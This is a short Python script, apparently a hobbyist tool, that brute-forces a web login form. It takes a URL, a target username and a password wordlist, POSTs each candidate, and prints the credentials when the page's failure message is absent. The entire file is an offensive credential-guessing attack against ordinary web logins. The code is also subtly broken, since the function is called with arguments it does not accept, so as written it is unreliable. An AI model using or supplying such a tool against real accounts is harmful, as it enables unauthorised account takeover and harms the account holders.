import requests


url=input('[+]Enter Page URL: ')
username=input('[+]Enter Username For The Account To BruteForce: ')
password_file=input('[+]Enter Password ile To Use:')
login_failed_string=input('[+]Enter String That Occurs Ehen Login Fails:')

def cracking():
    for password in passwords:
        password=password.strip()
        print("Trying...")
        data={'username':username,'password':password,'Login':'submit'}
        responce=requests.post(url,data=data)
        if login_failed_string in responce.content.decode():
            pass
        else:
            print('[+]Found Username: >> '+username)
            print('[+]Found Password: >> '+password)
            exit()

with open(password_file,'r') as  passwords:
    cracking(username,url)

print("[!!]Password Not IN List")